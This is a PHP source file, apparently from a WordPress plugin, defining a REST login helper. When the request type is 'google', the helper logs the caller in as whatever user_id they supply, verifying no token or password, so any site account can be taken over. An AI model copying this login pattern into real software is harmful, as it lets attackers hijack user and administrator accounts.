<?php


function ept_uf_login_helper($login_request){
  $params = $login_request->get_json_params();
  /*
  $response['status'] = 1;
  $response['1'] = !isset($params['type'], $params['user_id']);
  $response['2'] = !isset($params['user_id']);
  $response['3'] = ($params['type'] != 'google');
  $response['4'] = ($params['type'] != 'register');
  $response['params'] = $params;
  $response['type'] = $params['type'];
  $response['check'] = ($params['type'] == 'google');
  */
  if(
    !isset($params['type'], $params['user_id']) ||
    ($params['type'] != 'google' && $params['type'] != 'register')
  )
{
    return $response;
}
  $user = get_user_by('id', $params['user_id']);
  if (!($user)){
    $response['message'] = 'User not found.';
    return $response;
  }
  else{
    if($params['type'] == 'google'){
      $response['gogogl'] = 2;
      wp_clear_auth_cookie(); 
      wp_set_current_user($user->ID);     
      wp_set_auth_cookie($user->ID);
      do_action('wp_login', $user->user_login, $user);

    }
    $response['status'] = 2;
    $response['userID'] = $user->ID;
  }

  
  return $response;


}